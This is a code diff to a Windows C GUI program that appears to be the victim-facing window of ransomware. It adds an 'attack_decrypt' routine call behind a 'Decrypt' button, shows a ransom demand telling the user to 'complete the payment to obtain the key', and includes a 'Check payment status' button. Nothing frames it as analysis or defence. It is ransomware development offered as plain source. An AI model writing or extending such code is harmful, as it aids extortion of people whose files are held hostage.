@@ -1,3 +1,5 @@
+#include "attack_decrypt.h"
+
 #include <windows.h>
 #include <commctrl.h>
 #include <stdio.h>
@@ -262,7 +264,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
         {
         case 1:
             MessageBox(hwnd, "You clicked Check payment status!", "Info", MB_OK | MB_ICONINFORMATION);
-            SendMessage(hStatusBar, SB_SETTEXT, 0, (LPARAM)"OK clicked");
+            SendMessage(hStatusBar, SB_SETTEXT, 0, (LPARAM)"Check clicked");
             break;
 
         case 2:
@@ -279,8 +281,12 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
                 CloseClipboard();
             }
         case 3:
-            MessageBox(hwnd, "You clicked Decrypt!", "Info", MB_OK | MB_ICONINFORMATION);
-            SendMessage(hStatusBar, SB_SETTEXT, 0, (LPARAM)"OK clicked");
+            if (attack_decrypt() != 0) {
+                MessageBox(hwnd, "Please complete the payment to obtain the key. \r\n Note: the payment is registered after abount 1 hour.", "Info", MB_OK | MB_ICONINFORMATION);
+            } else {
+                MessageBox(hwnd, "Your files have been decrypted!", "Info", MB_OK | MB_ICONINFORMATION);
+            }
+            SendMessage(hStatusBar, SB_SETTEXT, 0, (LPARAM)"Decrypt clicked");
             break;
 
         }
